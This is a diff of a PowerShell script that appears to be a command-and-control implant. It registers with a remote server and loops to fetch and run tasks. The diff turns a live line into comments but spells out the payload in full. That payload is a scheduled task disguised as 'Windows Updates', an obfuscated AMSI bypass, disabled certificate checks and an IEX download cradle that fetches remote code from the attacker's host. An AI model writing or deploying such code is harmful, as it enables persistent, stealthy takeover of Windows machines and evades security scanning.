@@ -1,7 +1,5 @@
-    function Invoke-Executable {
-    # Runs the specified executable and captures its exit code, stdout
-    # and stderr.
-    # Returns: custom object.
+    # Runs the specified executable and captures its exit code, stdout and stderr. Returns: custom object.
+    function Invoke-Executable { 
     param(
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
@@ -108,7 +106,13 @@ $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POS
 #Declaring tasks and results links 
 $taskl   = ("https" + ':' + "//$ip" + ':' + "$port/tasks/$name/")    # --> https://192.168.19.133:8000/tasks/SDFCXS
 $resultl = ("https" + ':' + "//$ip" + ':' + "$port/results/$name/")
-schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr 'echo "C:\Windows\System32\cmd.exe /c `"$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(`"NonPublic,Static`");ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = ${true}; IEX(New-Object Net.WebClient).DownloadString(`"https://192.168.19.133:8000/sc/eth0`")`" "| powershell -ep bypass ' /F
+
+#echo PAYLOAD into file
+#schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr 'C:\Windows\System32\cmd.exe /c "echo [cat the payload file] | powershell -ep bypass " ' /F
+
+#PAYLOAD : $apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields('NonPublic,Static');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX(New-Object Net.WebClient).DownloadString('https://$ip:$port/sc/eth0') 
+#C:\Windows\System32\cmd.exe /c "echo [PAYLOAD] | powershell -ep bypass"
+
 
 #Loop to check for tasks, recieve, execute & sends results in result Link
 for (;;){
